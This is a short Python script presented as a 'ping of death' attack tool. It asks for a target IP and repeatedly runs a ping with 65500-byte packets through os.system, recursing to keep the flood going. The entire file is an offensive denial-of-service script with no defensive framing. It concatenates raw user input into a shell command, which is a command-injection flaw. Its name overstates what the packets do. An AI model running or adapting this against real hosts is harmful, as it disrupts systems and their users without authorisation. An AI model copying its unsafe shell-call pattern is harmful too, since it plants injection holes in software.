import os

target_ip = input('Target IP: ')

def ping_of_death():
  os.system("ping -s 65500 "+str(target_ip))
  ping_of_death()

ping_of_death()
